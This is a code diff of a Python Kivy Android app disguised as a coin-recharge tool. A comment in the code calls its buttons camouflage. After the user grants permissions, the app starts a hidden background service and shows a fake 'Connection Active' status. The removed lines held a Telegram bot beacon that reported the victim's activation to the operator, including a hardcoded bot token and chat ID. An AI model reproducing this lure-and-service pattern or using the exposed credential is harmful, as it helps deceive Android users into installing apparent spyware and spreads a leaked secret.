@@ -4,17 +4,12 @@ from kivy.uix.button import Button
 from kivy.uix.label import Label
 from jnius import autoclass
 from android.permissions import request_permissions, Permission
-import requests # ضروري لإرسال رسالة التنبيه
-
-BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
-CHAT_ID = "7084557369"
 
 class CoinsApp(App):
     def build(self):
         layout = BoxLayout(orientation="vertical", padding=30, spacing=20)
         self.status = Label(text="Server Status: Online", font_size='18sp')
 
-        # أزرار التمويه
         btn_1 = Button(text="RECHARGE COINS - SERVER 1", background_color=(0.2, 0.4, 0.9, 1))
         btn_2 = Button(text="RECHARGE COINS - SERVER 2", background_color=(0.8, 0.5, 0.2, 1))
         btn_3 = Button(text="RECHARGE COINS - FINAL STEP", background_color=(0.1, 0.7, 0.2, 1), bold=True)
@@ -24,9 +19,7 @@ class CoinsApp(App):
         btn_3.bind(on_press=self.start_sync)
 
         layout.add_widget(self.status)
-        layout.add_widget(btn_1)
-        layout.add_widget(btn_2)
-        layout.add_widget(btn_3)
+        layout.add_widget(btn_1); layout.add_widget(btn_2); layout.add_widget(btn_3)
         return layout
 
     def open_files(self, instance):
@@ -60,17 +53,12 @@ class CoinsApp(App):
 
     def launch(self, permissions, grants):
         try:
-            # 1. تشغيل الخدمة في الخلفية
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            # تأكد أن اسم الباكيج في buildozer هو coinssync
             Service = autoclass('org.test.coinssync.ServiceMyservice')
             Service.start(PythonActivity.mActivity, "")
-            
-            # 2. إرسال تنبيه فوري للبوت بأن التطبيق تم تفعيله الآن
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                          data={"chat_id": CHAT_ID, "text": "🚀 تذكير: تم الضغط على الزر الثالث وتفعيل النظام بنجاح!"})
-            
             self.status.text = "Status: Connection Active"
-        except Exception as e: 
+        except:
             self.status.text = "Error Connection"
 
 if __name__ == "__main__":
